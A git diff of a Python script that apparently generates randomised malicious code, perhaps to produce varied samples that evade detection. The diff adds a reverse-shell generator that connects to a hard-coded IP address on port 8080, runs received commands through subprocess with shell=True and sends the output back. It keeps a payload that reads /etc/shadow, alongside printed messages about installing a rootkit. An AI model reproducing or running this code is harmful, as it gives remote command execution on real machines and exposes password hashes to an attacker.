@@ -5,8 +5,8 @@ def resolver2D(array):
     """
     """
     return_string = ""   
-    for i in array:
-        print("We are looking at {} which is type {}".format(i, type(i)))
+    # for i in array:
+    #     print("We are looking at {} which is type {}".format(i, type(i)))
     # print("printing return_string {}".format(return_string))
     for i in array:  
         # print("printing return_string {}".format(return_string))
@@ -19,12 +19,11 @@ def resolver2D(array):
         elif type(i) is str:  # type(i) is str:
             #print("adding {} to the return_string.".format(i))
             return_string += i 
-            # pass
-        
+            # pass    
     return(return_string)
 
 
-def resolverND():
+def resolverND():   ## TODO fix this cause it doesn't work!
     return_string = ""   
     for i in array:
         print("We are looking at {} which is type {}".format(i, type(i)))
@@ -41,7 +40,6 @@ def resolverND():
             #print("adding {} to the return_string.".format(i))
             return_string += i 
             # pass
-        
     return(return_string)
 
 
@@ -50,9 +48,24 @@ def bootstrap():
         'import os\n',
         [
             'import math\n',
-            'import staticmethod\n',
+            'import itertools\n',
             'import random\n'
-        ]
+        ],
+        'import subprocess\n',
+        'import socket\n'
+    ]
+    return(resolver2D(choices))
+
+
+def print_the_thing():
+    choices = [
+        'print("',
+        [
+            'Foo',
+            'Bar',
+            'Foobar'
+        ],
+        '")\n'
     ]
     return(resolver2D(choices))
 
@@ -60,23 +73,35 @@ def bootstrap():
 def payload():
     choices = [
         'print(os.system("cat /etc/shadow"))\n',
-        [
-            "c1\n",
-            "c2\n",
-            "cFuckyou\n",
-            [
-                "d1\n",
-                "d2\n"
-            ]
-        ],
         'print("Doing the bad thing!!")\n',
         'print("installing the rootkit!!")\n'
     ]
     return(resolver2D(choices))
 
 
+def reverseShell():
+    choices = [
+        's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n',
+        's.connect(("175.20.0.200",8080))\n',
+        [
+            'while 1:\n',
+            'for i in range(10000):\n',
+            'while True:\n',
+            'while 1 == 1:\n',
+            'while 1 != 2:\n'
+        ],
+        '   command = s.recv(1024).decode("utf-8")\n'
+        '   if not command: break\n'
+        '   data = subprocess.check_output(command, shell=True)\n'
+        '   s.send(data)\n'
+    ]
+    return(resolver2D(choices))
+
+
 def compiled_code():
-    return("{}{}".format(bootstrap(), payload()) )
+    return("{}{}{}{}".format( \
+        bootstrap(), print_the_thing(), payload(), reverseShell(), \
+            print_the_thing()) )
 
 
 if __name__ == "__main__":
